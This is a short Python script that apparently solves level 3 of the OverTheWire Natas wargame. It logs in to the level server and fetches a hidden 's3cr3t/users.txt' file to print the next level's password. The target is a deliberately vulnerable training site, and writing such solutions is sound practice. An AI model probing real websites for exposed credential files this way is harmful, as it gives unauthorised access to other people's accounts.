import requests

url = "http://natas3.natas.labs.overthewire.org/"
auth = ("natas3", "secret")

response = requests.get(url=url + "s3cr3t/users.txt", auth=auth)

print("[+]Here your pass:")
print(response.text)